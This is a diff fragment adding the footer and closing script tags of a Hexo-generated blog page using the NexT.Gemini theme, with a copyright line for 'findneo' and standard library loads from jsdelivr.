+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
